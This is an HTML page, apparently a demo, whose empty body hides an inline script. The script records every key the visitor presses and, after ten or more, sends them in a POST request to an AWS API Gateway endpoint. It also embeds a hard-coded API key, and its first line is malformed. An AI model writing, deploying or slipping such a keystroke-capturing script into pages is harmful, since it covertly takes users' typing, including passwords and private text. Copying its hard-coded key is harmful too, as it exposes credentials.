<!DOCTYPE html>
<html>
  <head>
    <script>
      Origin: https:URL;
      const ID1 = '2twhynojr3';
      const AREA = 'ap-northeast-1';
    //   ココ！
      const URL = `https://${ID1}.execute-api.${AREA}.amazonaws.com/dev/`;
      const KEY = 'OjwoF3m0l20OFidHsRea3ptuQRfQL10ahbEtLa';

    //   ココ！
      const method = "POST";
      const headers = {
          'x-api-key': `A${KEY}s`,
          // 'Access-Control-Allow-Origin': '*',
          'Content-Type': 'application/json'
      };

      var buffers = [];

    //   ココ！
      var buttonClick = () => {
        var text = buffers.join(' ');
        var data = JSON.stringify({
          test: 'test',
          keys: text
        });
        console.log(data);
        buffers = [];

   
       

        // ココ！
        fetch(URL, {
          mode: 'cors',
          method: method, // or 'PUT'
          headers: headers,
          body: data,
        })
        .then(response => response.json())
        .then(data => {
          console.log('Success:', data);
        })
        .catch((error) => {
          console.error('Error:', error);
        });

      };

      document.addEventListener('keydown', (event) => {
        var keyName = event.key;
        buffers.push(keyName);

        if (event.ctrlKey) {
          console.log(`keydown:Ctrl + ${keyName}`);
        } else if (event.shiftKey) {
          console.log(`keydown:Shift + ${keyName}`);
        } else {
          console.log(`keydown:${keyName}`);
        }

        var size = buffers.length;
        if (size>=10){
          setTimeout(buttonClick, 3000);
        }
      });

    </script>
  </head>
  <body>
  </body>
</html>
